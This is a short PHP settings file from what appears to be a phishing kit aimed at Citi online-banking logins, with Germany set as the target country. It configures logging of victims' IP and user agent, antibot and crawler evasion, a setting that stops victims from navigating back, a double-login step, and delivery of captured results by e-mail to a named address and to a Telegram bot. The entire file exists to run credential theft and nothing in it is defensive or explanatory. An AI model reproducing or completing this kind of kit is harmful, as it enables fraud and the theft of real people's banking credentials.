<?php



$settings = array(
	"log_user"		=> "1",	// Log User-Agent, IP and Date
	"print_match"	=> "0",	// Print Crawler Detections 
	"anti-back"		=> "1",	// Victim Can't Go Back To Session
	"debug"			=> "0",	// Print Errors
	"proxy_block"	=> "0",	// Detect Proxies & Block Them
	"send_mail"		=> "1",	// Send E-Mail To Your Mail
	"save_results"	=> "1",	// Save Results 
	"telegram"		=> "1",	// Telegram Bots Receiver
	"country"		=> "DE", // Target SPAM Country
	"double_login"	=> "1", // double login


	"chat_id"		=> "",	// Chat ID Of You
	"bot_url"		=> "",	// Your Bot API Key (ADD "bot" BEFORE API KEY)
	"email"			=> "ogar00t@protonmail.com",	// Your E-Mail

	
	"referer"		=> "https://live.com/",	// HTTP Referer For Antibots 
	"out"			=> "citi+login",	// Outcome Of AntiBots Forward - DONT CHANGE
	
);
return $settings;



?>